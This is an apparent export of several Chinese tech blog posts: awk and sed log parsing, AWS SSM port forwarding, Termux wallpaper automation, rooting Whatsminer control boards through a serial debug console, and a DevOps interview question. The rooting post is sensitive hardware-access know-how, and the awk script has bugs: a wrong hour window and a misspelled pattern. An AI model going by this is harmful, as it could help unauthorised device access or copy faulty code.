发生的时间（小时级），例如0100-0200，0300-0400, (timeWindow)
在小时级别内发生的次数 (numberOfOccurrence)

分析这里考察的点应该就是多行日志的处理（主要是合并）问题，这个可以借助 sed 可以搞定，但还有一个重复日志的问题，也就是当日志行里有“— last message repeated 1 time —”时的处理问题，没想好怎样完美的解决。
最终方案代码gzcat data.gz | head -n 40 | sed -e &#x27;1h;2,$H;$!d;g;s/\n\t/ /g&#x27; | awk -f log_ana.awk&gt; data.json# 上面的 head -n 40 主要是为了演示，只取头 40 行数据，真正的环境是取的整个数据文件的所有数据curl -X POST -H &quot;Content-Type: application/json&quot; -d @data.json https://foo.com/bar

其中 log_ana.awk 代码如下：
#! /usr/bin/awk -fBEGIN &#123;    pre_logline = &quot;&quot;&#125;&#123;    processId = 0    deviceName = &quot;&quot;    processName = &quot;&quot;    description = &quot;&quot;    timeWindow = &quot;&quot;&#125;/--- last message peated 1 time ---/ &#123;    sub(/--- last message peated 1 time ---/, pre_logline)&#125;&#123;    delete a    split($3, a, &quot;:&quot;)    if (a[1] == &quot;00&quot;)        timeWindow = &quot;0000-0100&quot;    else if (a[1] == &quot;01&quot;)        timeWindow = &quot;0100-0200&quot;    else if (a[1] == &quot;02&quot;)        timeWindow = &quot;0220-0300&quot;    else if (a[1] == &quot;03&quot;)        timeWindow = &quot;0300-0400&quot;    else if (a[1] == &quot;04&quot;)        timeWindow = &quot;0400-0500&quot;    else if (a[1] == &quot;05&quot;)        timeWindow = &quot;0500-0600&quot;    else if (a[1] == &quot;06&quot;)        timeWindow = &quot;0600-0700&quot;    else if (a[1] == &quot;07&quot;)        timeWindow = &quot;0700-0800&quot;    else if (a[1] == &quot;08&quot;)        timeWindow = &quot;0800-0900&quot;    else if (a[1] == &quot;09&quot;)        timeWindow = &quot;0900-1000&quot;    else if (a[1] == &quot;10&quot;)        timeWindow = &quot;1000-1100&quot;    else if (a[1] == &quot;11&quot;)        timeWindow = &quot;1100-1200&quot;    else if (a[1] == &quot;12&quot;)        timeWindow = &quot;1200-1300&quot;    else if (a[1] == &quot;13&quot;)        timeWindow = &quot;1300-1400&quot;    else if (a[1] == &quot;14&quot;)        timeWindow = &quot;1400-1500&quot;    else if (a[1] == &quot;15&quot;)        timeWindow = &quot;1500-1600&quot;    else if (a[1] == &quot;16&quot;)        timeWindow = &quot;1600-1700&quot;    else if (a[1] == &quot;17&quot;)        timeWindow = &quot;1700-1800&quot;    else if (a[1] == &quot;18&quot;)        timeWindow = &quot;1800-1900&quot;    else if (a[1] == &quot;19&quot;)        timeWindow = &quot;1900-2000&quot;    else if (a[1] == &quot;20&quot;)        timeWindow = &quot;2000-2100&quot;    else if (a[1] == &quot;21&quot;)        timeWindow = &quot;2100-2200&quot;    else if (a[1] == &quot;22&quot;)        timeWindow = &quot;2200-2300&quot;    else if (a[1] == &quot;23&quot;)        timeWindow = &quot;2300-2400&quot;    else &#123;    &#125;    for (i = 4; i&lt;=NF; i++) &#123;        if (i == 4) &#123;            pre_logline = $i        &#125; else &#123;            pre_logline = pre_logline&quot; &quot;$i        &#125;    &#125;    if ((pre_logline, timeWindow) in countA) &#123;        countA[pre_logline, timeWindow] = countA[pre_logline, timeWindow] + 1    &#125; else &#123;        countA[pre_logline, timeWindow] = 1    &#125;&#125;END &#123;    print &quot;[&quot;    n = 1    sum = 0    for (k in countA) &#123;        processId = 0        deviceName = &quot;&quot;        processName = &quot;&quot;        description = &quot;&quot;        timeWindow = &quot;&quot;        c = length(countA)        delete a        split(k, a, SUBSEP)	numberOfOccurrence = countA[a[1], a[2]]        timeWindow = a[2]        delete aa        split(a[1], aa, &quot; &quot;)        deviceName = aa[1]        delete aaa        split(aa[2], aaa, &quot;]&quot;)        delete aaaa        split(aaa[1], aaaa, &quot;[&quot;)        processName = aaaa[1]        processId = aaaa[2]        for (i = 3; i&lt;=length(aa); i++) &#123;            gsub(/&quot;/, &quot;\\\&quot;&quot;, aa[i])            if (i == 3) &#123;                description = aa[i]            &#125; else &#123;                description = description&quot; &quot;aa[i]            &#125;        &#125;    	printf &quot;  &#123;\n    \&quot;deviceName\&quot;:\&quot;%s\&quot;, \n    \&quot;processId\&quot;:%d, \n    \&quot;processName\&quot;:\&quot;%s\&quot;, \n    \&quot;description\&quot;:\&quot;%s\&quot;, \n    \&quot;timeWindow\&quot;:\&quot;%s\&quot;, \n    \&quot;numberOfOccurrence\&quot;:%d \n  &#125;&quot;, deviceName, processId, processName, description, timeWindow, numberOfOccurrence        sum = sum + numberOfOccurrence        if (n &lt; c)            print &quot;, &quot;        else            print &quot;&quot;        n++    &#125;    print &quot;]&quot;&#125;

data.json 文件的内容可以这样看：
cat data.json

[  &#123;    &quot;deviceName&quot;:&quot;BBAOMACBOOKAIR2&quot;,    &quot;processId&quot;:1,    &quot;processName&quot;:&quot;com.apple.xpc.launchd&quot;,    &quot;description&quot;:&quot;(com.apple.mdworker.bundles[12560]): Could not find uid associated with service: 0: Undefined error: 0 501&quot;,    &quot;timeWindow&quot;:&quot;0000-0100&quot;,    &quot;numberOfOccurrence&quot;:1  &#125;,  &#123;    &quot;deviceName&quot;:&quot;BBAOMACBOOKAIR2&quot;,    &quot;processId&quot;:1,    &quot;processName&quot;:&quot;com.apple.xpc.launchd&quot;,    &quot;description&quot;:&quot;(com.apple.mdworker.bundles[12535]): Could not find uid associated with service: 0: Undefined error: 0 501&quot;,    &quot;timeWindow&quot;:&quot;0000-0100&quot;,    &quot;numberOfOccurrence&quot;:1  &#125;,  &#123;    &quot;deviceName&quot;:&quot;---&quot;,    &quot;processId&quot;:0,    &quot;processName&quot;:&quot;last&quot;,    &quot;description&quot;:&quot;message repeated 1 time ---&quot;,    &quot;timeWindow&quot;:&quot;0000-0100&quot;,    &quot;numberOfOccurrence&quot;:1  &#125;,  &#123;    &quot;deviceName&quot;:&quot;BBAOMACBOOKAIR2&quot;,    &quot;processId&quot;:1,    &quot;processName&quot;:&quot;com.apple.xpc.launchd&quot;,    &quot;description&quot;:&quot;(com.apple.mdworker.bundles[12513]): Service exited with abnormal code: 78&quot;,    &quot;timeWindow&quot;:&quot;0000-0100&quot;,    &quot;numberOfOccurrence&quot;:1  &#125;,  &#123;    &quot;deviceName&quot;:&quot;BBAOMACBOOKAIR2&quot;,    &quot;processId&quot;:1,    &quot;processName&quot;:&quot;com.apple.xpc.launchd&quot;,    &quot;description&quot;:&quot;(com.apple.preference.displays.MirrorDisplays): Service only ran for 9 seconds. Pushing respawn out by 1 seconds.&quot;,    &quot;timeWindow&quot;:&quot;0000-0100&quot;,    &quot;numberOfOccurrence&quot;:1  &#125;,  &#123;    &quot;deviceName&quot;:&quot;BBAOMACBOOKAIR2&quot;,    &quot;processId&quot;:158,    &quot;processName&quot;:&quot;timed&quot;,    &quot;description&quot;:&quot;settimeofday(&#123;0x5ebacd96,0x52ddf&#125;) == 0&quot;,    &quot;timeWindow&quot;:&quot;0000-0100&quot;,    &quot;numberOfOccurrence&quot;:1  &#125;,  &#123;    &quot;deviceName&quot;:&quot;BBAOMACBOOKAIR2&quot;,    &quot;processId&quot;:1,    &quot;processName&quot;:&quot;com.apple.xpc.launchd&quot;,    &quot;description&quot;:&quot;(com.apple.xpc.launchd.domain.user.914945058): Service \&quot;com.apple.xpc.launchd.unmanaged.loginwindow.594\&quot; tried to register for endpoint \&quot;com.apple.tsm.uiserver\&quot; already registered by owner: com.apple.TextInputMenuAgent&quot;,    &quot;timeWindow&quot;:&quot;0000-0100&quot;,    &quot;numberOfOccurrence&quot;:1  &#125;,  &#123;    &quot;deviceName&quot;:&quot;BBAOMACBOOKAIR2&quot;,    &quot;processId&quot;:113,    &quot;processName&quot;:&quot;syslogd&quot;,    &quot;description&quot;:&quot;Configuration Notice: ASL Module \&quot;com.apple.install\&quot; claims selected messages. Those messages may not appear in standard system log files or in the ASL database.&quot;,    &quot;timeWindow&quot;:&quot;0000-0100&quot;,    &quot;numberOfOccurrence&quot;:1  &#125;,  &#123;    &quot;deviceName&quot;:&quot;BBAOMACBOOKAIR2&quot;,    &quot;processId&quot;:1,    &quot;processName&quot;:&quot;com.apple.xpc.launchd&quot;,    &quot;description&quot;:&quot;(com.apple.mdworker.bundles[12610]): Could not find uid associated with service: 0: Undefined error: 0 501&quot;,    &quot;timeWindow&quot;:&quot;0000-0100&quot;,    &quot;numberOfOccurrence&quot;:1  &#125;,  &#123;    &quot;deviceName&quot;:&quot;BBAOMACBOOKAIR2&quot;,    &quot;processId&quot;:1,    &quot;processName&quot;:&quot;com.apple.xpc.launchd&quot;,    &quot;description&quot;:&quot;(com.apple.mdworker.bundles[12610]): Service exited with abnormal code: 78&quot;,    &quot;timeWindow&quot;:&quot;0000-0100&quot;,    &quot;numberOfOccurrence&quot;:1  &#125;,  &#123;    &quot;deviceName&quot;:&quot;BBAOMACBOOKAIR2&quot;,    &quot;processId&quot;:1,    &quot;processName&quot;:&quot;com.apple.xpc.launchd&quot;,    &quot;description&quot;:&quot;(com.apple.preference.displays.MirrorDisplays): Service only ran for 4 seconds. Pushing respawn out by 6 seconds.&quot;,    &quot;timeWindow&quot;:&quot;0000-0100&quot;,    &quot;numberOfOccurrence&quot;:1  &#125;,  &#123;    &quot;deviceName&quot;:&quot;BBAOMACBOOKAIR2&quot;,    &quot;processId&quot;:1,    &quot;processName&quot;:&quot;com.apple.xpc.launchd&quot;,    &quot;description&quot;:&quot;(com.apple.mdworker.bundles[12535]): Service exited with abnormal code: 78&quot;,    &quot;timeWindow&quot;:&quot;0000-0100&quot;,    &quot;numberOfOccurrence&quot;:1  &#125;,  &#123;    &quot;deviceName&quot;:&quot;BBAOMACBOOKAIR2&quot;,    &quot;processId&quot;:1,    &quot;processName&quot;:&quot;com.apple.xpc.launchd&quot;,    &quot;description&quot;:&quot;(com.apple.xpc.launchd.domain.pid.mdmclient.12523): Failed to bootstrap path: path = /usr/libexec/mdmclient, error = 108: Invalid path&quot;,    &quot;timeWindow&quot;:&quot;0000-0100&quot;,    &quot;numberOfOccurrence&quot;:1  &#125;,  &#123;    &quot;deviceName&quot;:&quot;BBAOMACBOOKAIR2&quot;,    &quot;processId&quot;:960,    &quot;processName&quot;:&quot;VTDecoderXPCService&quot;,    &quot;description&quot;:&quot;DEPRECATED USE in libdispatch client: Changing target queue hierarchy after xpc connection was activated; set a breakpoint on _dispatch_bug_deprecated to debug&quot;,    &quot;timeWindow&quot;:&quot;0000-0100&quot;,    &quot;numberOfOccurrence&quot;:4  &#125;,  &#123;    &quot;deviceName&quot;:&quot;BBAOMACBOOKAIR2&quot;,    &quot;processId&quot;:1,    &quot;processName&quot;:&quot;com.apple.xpc.launchd&quot;,    &quot;description&quot;:&quot;(com.apple.mdworker.bundles[12555]): Could not find uid associated with service: 0: Undefined error: 0 501&quot;,    &quot;timeWindow&quot;:&quot;0000-0100&quot;,    &quot;numberOfOccurrence&quot;:1  &#125;,  &#123;    &quot;deviceName&quot;:&quot;BBAOMACBOOKAIR2&quot;,    &quot;processId&quot;:960,    &quot;processName&quot;:&quot;VTDecoderXPCService&quot;,    &quot;description&quot;:&quot;DEPRECATED USE in libdispatch client: Changing the target of a source after it has been activated; set a breakpoint on _dispatch_bug_deprecated to debug&quot;,    &quot;timeWindow&quot;:&quot;0000-0100&quot;,    &quot;numberOfOccurrence&quot;:4  &#125;,  &#123;    &quot;deviceName&quot;:&quot;BBAOMACBOOKAIR2&quot;,    &quot;processId&quot;:1,    &quot;processName&quot;:&quot;com.apple.xpc.launchd&quot;,    &quot;description&quot;:&quot;(com.apple.mdworker.bundles[12536]): Service exited with abnormal code: 78&quot;,    &quot;timeWindow&quot;:&quot;0000-0100&quot;,    &quot;numberOfOccurrence&quot;:1  &#125;,  &#123;    &quot;deviceName&quot;:&quot;BBAOMACBOOKAIR2&quot;,    &quot;processId&quot;:1,    &quot;processName&quot;:&quot;com.apple.xpc.launchd&quot;,    &quot;description&quot;:&quot;(com.apple.mdworker.bundles[12513]): Could not find uid associated with service: 0: Undefined error: 0 501&quot;,    &quot;timeWindow&quot;:&quot;0000-0100&quot;,    &quot;numberOfOccurrence&quot;:1  &#125;,  &#123;    &quot;deviceName&quot;:&quot;BBAOMACBOOKAIR2&quot;,    &quot;processId&quot;:1,    &quot;processName&quot;:&quot;com.apple.xpc.launchd&quot;,    &quot;description&quot;:&quot;(com.apple.mdworker.bundles[12536]): Could not find uid associated with service: 0: Undefined error: 0 501&quot;,    &quot;timeWindow&quot;:&quot;0000-0100&quot;,    &quot;numberOfOccurrence&quot;:1  &#125;,  &#123;    &quot;deviceName&quot;:&quot;BBAOMACBOOKAIR2&quot;,    &quot;processId&quot;:1,    &quot;processName&quot;:&quot;com.apple.xpc.launchd&quot;,    &quot;description&quot;:&quot;(com.apple.ScreenSaver.Computer-Name[12564]): Service exited due to SIGKILL | sent by Computer Name[12564]&quot;,    &quot;timeWindow&quot;:&quot;0000-0100&quot;,    &quot;numberOfOccurrence&quot;:1  &#125;,  &#123;    &quot;deviceName&quot;:&quot;BBAOMACBOOKAIR2&quot;,    &quot;processId&quot;:1,    &quot;processName&quot;:&quot;com.apple.xpc.launchd&quot;,    &quot;description&quot;:&quot;(com.apple.mdworker.bundles[12555]): Service exited with abnormal code: 78&quot;,    &quot;timeWindow&quot;:&quot;0000-0100&quot;,    &quot;numberOfOccurrence&quot;:1  &#125;,  &#123;    &quot;deviceName&quot;:&quot;BBAOMACBOOKAIR2&quot;,    &quot;processId&quot;:113,    &quot;processName&quot;:&quot;syslogd&quot;,    &quot;description&quot;:&quot;Configuration Notice: ASL Module \&quot;com.apple.callhistory.asl.conf\&quot; claims selected messages.&quot;,    &quot;timeWindow&quot;:&quot;0000-0100&quot;,    &quot;numberOfOccurrence&quot;:1  &#125;,  &#123;    &quot;deviceName&quot;:&quot;BBAOMACBOOKAIR2&quot;,    &quot;processId&quot;:1,    &quot;processName&quot;:&quot;com.apple.xpc.launchd&quot;,    &quot;description&quot;:&quot;(com.apple.mdworker.bundles[12560]): Service exited with abnormal code: 78&quot;,    &quot;timeWindow&quot;:&quot;0000-0100&quot;,    &quot;numberOfOccurrence&quot;:1  &#125;,  &#123;    &quot;deviceName&quot;:&quot;BBAOMACBOOKAIR2&quot;,    &quot;processId&quot;:113,    &quot;processName&quot;:&quot;syslogd&quot;,    &quot;description&quot;:&quot;ASL Sender Statistics&quot;,    &quot;timeWindow&quot;:&quot;0000-0100&quot;,    &quot;numberOfOccurrence&quot;:3  &#125;,  &#123;    &quot;deviceName&quot;:&quot;BBAOMACBOOKAIR2&quot;,    &quot;processId&quot;:113,    &quot;processName&quot;:&quot;syslogd&quot;,    &quot;description&quot;:&quot;Configuration Notice: ASL Module \&quot;com.apple.cdscheduler\&quot; claims selected messages. Those messages may not appear in standard system log files or in the ASL database.&quot;,    &quot;timeWindow&quot;:&quot;0000-0100&quot;,    &quot;numberOfOccurrence&quot;:1  &#125;,  &#123;    &quot;deviceName&quot;:&quot;BBAOMACBOOKAIR2&quot;,    &quot;processId&quot;:1,    &quot;processName&quot;:&quot;com.apple.xpc.launchd&quot;,    &quot;description&quot;:&quot;(com.apple.mdworker.bundles[12556]): Could not find uid associated with service: 0: Undefined error: 0 501&quot;,    &quot;timeWindow&quot;:&quot;0000-0100&quot;,    &quot;numberOfOccurrence&quot;:1  &#125;,  &#123;    &quot;deviceName&quot;:&quot;BBAOMACBOOKAIR2&quot;,    &quot;processId&quot;:1,    &quot;processName&quot;:&quot;com.apple.xpc.launchd&quot;,    &quot;description&quot;:&quot;(com.apple.mdworker.bundles[12556]): Service exited with abnormal code: 78&quot;,    &quot;timeWindow&quot;:&quot;0000-0100&quot;,    &quot;numberOfOccurrence&quot;:1  &#125;]

这里的大概解释下：
多行日志的合并问题，这里是用 sed 命令解决的，awk 程序主要是处理了“— last message peated 1 time —”的问题以及做日志分析（从日志里抓取关键信息并做统计且生成上报数据文件）。其实这样不是特完美，毕竟日志文件循环了两遍，理论上来讲最好过一遍就处理完毕的，但是我在 awk 里实在是没想好怎样同时处理多行日志合并以及“— last message peated 1 time —”的问题。这里请各位大佬教我。
]]></content>
      <tags>
        <tag>curl</tag>
        <tag>sed</tag>
        <tag>awk</tag>
        <tag>gzcat</tag>
        <tag>head</tag>
        <tag>POST</tag>
        <tag>json</tag>
      </tags>
  </entry>
  <entry>
    <title>利用 AWS System Manager 来连 VPC 内网的资源</title>
    <url>/2023/03/%E5%88%A9%E7%94%A8%20AWS%20System%20Manager%20%E6%9D%A5%E8%BF%9E%20VPC%20%E5%86%85%E7%BD%91%E7%9A%84%E8%B5%84%E6%BA%90/index.html</url>
    <content><![CDATA[环境配置好的 EC2VPC 内需要有一台 EC2（有无公网 IP 好像没关系），并做好相关配置
安装 SSM AgentAmazon Linux（无论是 1，还是 2，或者是 2023） 一般是预装好的，只需要确认是否正常启动：
sudo systemctl status amazon-ssm-agent# 如果没有启动的话，设置为自启动，并启动sudo systemctl enable amazon-ssm-agentsudo systemctl start amazon-ssm-agent



如果系统没有安装过 SSM Agent，那么安装（以 CentOS 8 为例）：
sudo dnf install -y \    https://s3.amazonaws.com/ec2-downloads-windows/SSMAgent/latest/linux_amd64/amazon-ssm-agent.rpm

激活“默认主机管理配置”
访问 https://console.aws.amazon.com/systems-manager/，打开 AWS Systems Manager 控制台。
在导航窗格中，选择 Fleet Manager。或者如果首先打开 AWS Systems Manager 主页，选择菜单图标 (  ) 以打开导航窗格，然后在导航窗格中选择 Fleet Manager。
在账户管理下拉列表中选择默认主机管理配置。
打开启用默认主机管理配置。
选择用于为您的实例启用 Systems Manager 功能的 AWS Identity and Access Management（IAM）角色。我们建议使用“默认主机管理配置”提供的默认角色。它包含使用 Systems Manager 管理您的 Amazon EC2 实例所需的最低权限集合。如果您更喜欢使用自定义角色，则该角色的信任策略必须允许 Systems Manager 作为可信实体。
选择配置以完成设置。

注意：
在打开“默认主机管理配置”后，您的实例可能需要最长 30 分钟才能使用所选角色的凭证。您必须在要自动管理 Amazon EC2 实例的每个区域中打开“默认主机管理配置”。
如不做其他调整，最多 30 分钟以后，你会在 System Manager -&gt; Fleet Manager -&gt; Managed nodes 下看到你的 EC2 了
本地 aws-cli 和 Session Manager plugin# 我的本地环境是 Macbook Air (m1)，# 其他环境可能命令不一样curl \    &quot;https://awscli.amazonaws.com/AWSCLIV2.pkg&quot; \    -o &quot;AWSCLIV2.pkg&quot;sudo installer \    -pkg AWSCLIV2.pkg \    -target /# 以上命令是安装 aws-cli。# 然后当然还需要配置 aws --configure# 或 aws --profile xxx --configurecurl \    &quot;https://s3.amazonaws.com/session-manager-downloads/plugin/latest/mac_arm64/session-manager-plugin.pkg&quot; \    -o &quot;session-manager-plugin.pkg&quot;sudo installer \    -pkg session-manager-plugin.pkg \    -target /sudo ln \    -s /usr/local/sessionmanagerplugin/bin/session-manager-plugin \    /usr/local/bin/session-manager-plugin

具体使用场景一：登录服务器aws --profile test \    ssm start-session \    --target i-xxxxxxxxxxxxxxxxxx# &quot;i-xxxxxxxxxxxxxxxxxx&quot; 是这台 EC2 的 ID

场景二：打洞到 RDSaws --profile test \    ssm start-session \    --target i-xxxxxxxxxxxxxxxxxx \    --document-name AWS-StartPortForwardingSessionToRemoteHost \    --parameters 、    host=&quot;10.0.0.1&quot;,portNumber=&quot;3306&quot;,localPortNumber=&quot;5555&quot;# 这里的 “10.0.0.1” 是你要连的 MySQL 的 IP 地址，是假设的，得根据实际情况修改

然后就可以愉快的在本地连数据库了：
mysql -h 127.0.0.1 -P 5555 -U admin -p
]]></content>
      <tags>
        <tag>AWS</tag>
        <tag>AWS System Manager</tag>
        <tag>Session Manager</tag>
        <tag>SSM</tag>
        <tag>amazon-ssm-agent</tag>
        <tag>Fleet Manager</tag>
      </tags>
  </entry>
  <entry>
    <title>利用 Termux 和 Termux-API 在 Android 手机上定时自动更新壁纸</title>
    <url>/2022/10/%E5%88%A9%E7%94%A8%20termux%20%E5%92%8C%20termux-api%20%E5%9C%A8%20android%20%E6%89%8B%E6%9C%BA%E4%B8%8A%E5%AE%9A%E6%97%B6%E6%9B%B4%E6%96%B0%E5%A3%81%E7%BA%B8/index.html</url>
    <content><![CDATA[缘起这个事情的需求，其实……就是闲得。
开个玩笑。我其实之前用 Tasker 这个 APP 做过类似的事情，见之前文章：分享一些自己DIY的task的profile，但是有一阵遇到了 android 手机的壁纸 bug，我的 pixel 给干挂了两回，其中有一回甚至给重制了才救回来，救回来之后就没起过自动更换壁纸的任务了。
这次是看到 V 站上有个大佬，展示自己极少的 APP 时，截图里展示了一个桌面，上面的壁纸上有格言，还有英文单词。于是我就自然而然的想要不要把毒鸡汤也写到壁纸上呢？：）


环境准备Termux 和 Termux-API我这里环境（Termux 和 Termux-API）是现成的，但如果没有需要安装的话，请记住，不要装 google play 上的 Termux 和 Termux-API，而是要装 F-Droid 这个市场上的 Termux 和 Termux-API！
注意：要给 Termux 足够的权限（也许 Termux-API 也需要）：

后台运行的权限（不要被节电模式给干掉）
要设置为随机启动

最后，还要打开 Termux，输入：
apt install termux-api;# pkg install termux-api; # 也可以用命令 pkg

ImageMagick 及其他软件打开 Termux，继续输入：
apt install ImageMagick;apt install wget curl grep sed;

具体实现抓取毒鸡汤毒鸡汤 也是我自己 fork 了某个大佬的代码，自己搭建的服务。本身没提供 API 服务，这里也没想再开发一个 API 接口，所以直接模拟 web 访问，然后把需要的数据抓出来即可。不过我们还需要手工折行。
定时抓取壁纸并处理（用 ImageMagick）我自己有个壁纸服务：壁纸，会定时更新输出的壁纸，后台爬虫是用 go 实现的。
这里我就直接用了自己的这个壁纸服务，定时（每小时）去抓一个壁纸回来。接着做如下处理：

如果宽小于 1080 或者高小于 2400 的话，会首先被按原比例放大，直到宽达到 1080 或高达到 2400（具体看哪种放大的比率小）。
再接着在壁纸正中截取一个 1080x2400 的图片出来
最后在这个截取出来的 1080x2400 的图片的合适位置写上毒鸡汤服务中抓取出来的文本数据，把最终结果保存为文件

设置壁纸最后自然是把上一步保留的文件用 termux-wallpaper 命令（来自于软件包 Termux-API）设置成新壁纸。
把整个工作自动化把上面的流程写成代码（假设存为文件 $HOME&#x2F;bin&#x2F;change_wallpaper.sh），再用 termux-job-scheduler（来自于软件包 Termux-API）将这个代码设置为定时运行。我的例子里我是这样用的。打开 Termux，输入命令：
termux-job-scheduler \    --persisted true \    --period-ms 3600000 \    -s $HOME/bin/change_wallpaper.sh;# persisted 是指重启后保持有效# period-ms 3600000 是指一小时跑一次

几个坑中文字体在图片上写中文（含全角标点）时需要用中文的字体，因为普通字体里没有中文字符呀！
所以，要在所有可用字体里选出有中文字符且全角标点位置不在中间的，其实还有个想法，就是想找一个酷一点的中文字体，我把所有可用字体做了个循环，测试写中文字符以及全角标点，结果保存到文件里，代码大概如下：
for i in $(\    magick -list font | \    grep &quot;Font:&quot; | \    awk &#x27;&#123;print $2&#125;&#x27; \)do    echo $i    convert \        -font $i \        -pointsize 72 \        label:测，。试test \        x.jpg x-$&#123;i&#125;.jpgdone

我先在我的 Mac 里跑的，找到一堆合适的字体以后，再去找 Termux 里 magick -list font | grep &quot;Fonts:&quot; | awk &#39;&#123;print $2&#125;&#39; 的结果来做对比，结果发现，匹配上的只有一种字体：Noto-Serif-CJK-SC。:(
当然，也可以再单独在 Termux 里安装新的好看的可用字体。但我没这么做，看以后需求吧。
crond vs termux-job-scheduler其实最早这个方案我是打算用 crond 来做定时任务的，软件都安装设置好了。
打开 Termux，
apt install cronie termux-services;

关闭并重新打开 Termux
sv-enable crond;

但是发现用 crond 跑其他任务都没问题，但是跑 termux-API 里的命令总会报 Selinux 的错误！实在是搞不定啊，于是才转向 termux-job-scheduler 方案。
其实刚用 termux-job-scheduler 时日志里也出跟 crond 一样的信息，当时心就哇凉了，但没想到后来自己居然就好了？！：）
ImageMagick 的 -crop 跟 -gravity Center 一起用的问题ImageMagick 软件包里的命令：convert 有个参数：*-crop*，功能是用来从图片上截取一部分，这个参数还需要提供 x、y 两个参数，这两个可以理解为横坐标（x）和纵坐标（y），这个时候学过一点点编程基础的小可爱们是不是自然而然都会以为 -crop 参数（其实是操作参数，可以理解为命令）截取的长方形图片是以这个横坐标 x、纵坐标y 为顶点的呢？
我一开始也是这么认为的，所以当我用 -gravity Center 将坐标零点设置为图片中心之后，我将参数 x 和 y 分别设置成了 -540 和 -1200，结果就悲催了，最后经过调试，才知道当有 -gravity Center 时，x 和 y 是指截取长方形的中心的坐标！！！！
所以，这里的 x 和 y 都应该是 0 才对！！
change_wallpaper.sh 代码最后，show you the code:
#!/data/data/com.termux/files/usr/bin/bashTMP_IMG=&quot;$(mktemp $HOME/tmp/tmpimg.XXXXXX)&quot;sublen=8   # 每行显示的字符个数DJT_TXT=&quot;$(        curl -s https://djt.theyan.gs | \        grep -Po &#x27;(xxxxxxxxxx)&#x27; | \        sed -r &#x27;s/.&#123;&#x27;&quot;$sublen&quot;&#x27;&#125;/&amp;\n/g&#x27; \)&quot;wget -q -O - https://wallpaper.theyan.gs/wp | \    convert - \        -resize &#x27;1080x2400^&lt;&#x27; \        - | \    convert - -gravity Center \        -crop 1080x2400+0+0 \        +repage \        - | \    magick - -font Noto-Serif-CJK-SC \        -pointsize 128 \        -fill DarkViolet \        -annotate +5+500 \        &quot;$DJT_TXT&quot; \        $TMP_IMGtermux-wallpaper -f $TMP_IMGrm $TMP_IMG# 抓毒鸡汤那一段 grep 的正则需要自己调整这个程序才能正常跑# 不要来抓我的毒鸡汤的数据呀：（，这个项目程序、数据都是开源的，可以直接下载的，地址毒鸡汤上有。

最后，附壁纸截图一张：

]]></content>
      <tags>
        <tag>Android</tag>
        <tag>Termux</tag>
        <tag>Termux-API</tag>
        <tag>ImageMagick</tag>
        <tag>termux-job-scheduler</tag>
        <tag>termux-wallpaper</tag>
        <tag>F-Dorid</tag>
        <tag>convert</tag>
        <tag>magick</tag>
        <tag>cronie</tag>
        <tag>apt</tag>
        <tag>pkg</tag>
      </tags>
  </entry>
  <entry>
    <title>利用 ttl 连接获取神马（Whatsminer）矿机的 root 权限</title>
    <url>/2022/03/%E5%88%A9%E7%94%A8%20ttl%20%E8%BF%9E%E6%8E%A5%E8%8E%B7%E5%8F%96%E7%A5%9E%E9%A9%AC%E7%9F%BF%E6%9C%BA%E7%9A%84%20root%20%E6%9D%83%E9%99%90/index.html</url>
    <content><![CDATA[缘起最近在美丽国矿场帮忙，顺便修下矿机。
本来心里有些想法，需要有设备（计算设备、网络设备）来实现，无奈手头没有资源。后来修神马矿机的时候发现其系统是基于 OpenWRT 的！于是就想如果能拿到 root 权限的话，是不是就能利用现有系统来做很多事情了？于是就开始研究怎么 root 其控制板（其实还有其他难点，比如控制板怎么取电？还要给控制板找一个盒子）。
连接方法

前同事、硬件玩儿家、大佬陈总给了我一个关键性信息：用 ttl 连接控制板可以直接获得 root 权限！
然后我就开始找设备，正好同事为了维修，早就采购的有 ch341a 编程器，于是我又让其帮忙采购了一包杜邦线就 OK 了。
这里其实没有什么太多的技巧，就是用杜邦线把 ch341a 的几个 pin 脚接到神马矿机控制板的几个 pin 脚上，再把 ch341a 的 usb 头插进电脑，最后再用模拟终端软件打开，如果没有问题，则会直接进 root 环境。
请看截图连接方法也简单：

就是 RX 和 TX 互相接；
gnd 接 gnd；


控制板


注意：这里没有用杜邦线（因为当时杜邦线还没采购回来，所以用的是风扇的电源线），但这个图能清楚显示出接的是控制板上的哪几个 pin 脚

ch341a 编程器(非杜邦线)


注意：这图里也没有用杜邦线

ch341a 编程器插到电脑上



矿机、ch341a 编程器和电脑



获得 root 权限后的界面


电脑端配置我在 MacOS 未成功，最后用的是 Windows + Putty 配置成功了，连接的端口看下“设备管理器”，连接的其他配置参数为：115200,8,无,1,无
测试过的系统软件版本这个不是所有版本的控制板都可行的。猜想应该是早期工程师用来调试用的，后来把这个关掉了。据我测试的版本来说：

20200409.20.REL 可以
H6OS-V10-20210520.22.REL 不行
H6OS-V10-20210325.22.REL 不行
H3-V10-20200609.22.REL 可以！

]]></content>
      <tags>
        <tag>root</tag>
        <tag>OpenWRT</tag>
        <tag>whatsminer</tag>
        <tag>神马矿机</tag>
        <tag>M21</tag>
        <tag>M20</tag>
        <tag>M30</tag>
        <tag>hack</tag>
        <tag>ttl</tag>
        <tag>ch341a</tag>
        <tag>编程器</tag>
        <tag>杜邦线</tag>
        <tag>putty</tag>
        <tag>cp2102</tag>
        <tag>pl2303</tag>
      </tags>
  </entry>
  <entry>
    <title>我做的某公司 DevOps 远程职位的面试题</title>
    <url>/2024/01/%E6%88%91%E5%81%9A%E7%9A%84%E6%9F%90%E5%85%AC%E5%8F%B8%20DevOps%20%E8%BF%9C%E7%A8%8B%E8%81%8C%E4%BD%8D%E7%9A%84%E9%9D%A2%E8%AF%95%E9%A2%98/index.html</url>
    <content><![CDATA[简介这是之前有一家海外公司招 DevOps 工程师，我投了简历，期望薪资写了薪资范围的最下限，然后被给了份题让先做一下，于是便有了这篇“水”文。
当然，最终我并没有拿到这个 offer，甚至连下一轮见 CTO 的机会都没有。（关于这个，我其实心里还是有一点小小的不服气的。）


题目详情Q1写一个定时执行的 Bash 脚本，每月的一号凌晨 1 点对 MongoDB 中 test.user_log 表进行备份、清理，具体要求如下：

首先备份上个月的数据，备份完成后打包成.gz文件
备份文件通过 sftp 传输到 backup [&#x62;&#x61;&#x6b;&#x75;&#112;&#64;&#x62;&#x61;&#x6b;&#117;&#112;&#46;&#120;&#120;&#120;&#x2e;&#x63;&#111;&#x6d;] 服务器上，账户已经配置在~&#x2F;.ssh&#x2F;config
备份完成后，再对备份过的数据进行清理: create_on [2024-01-01 03:33:11]
如果脚本执行失败或者异常，则调用 https://monitor.xxx.com/webhook/mongodb
这个表每日数据量大约在 200w 条, 单条数据未压缩的存储大小约 200B

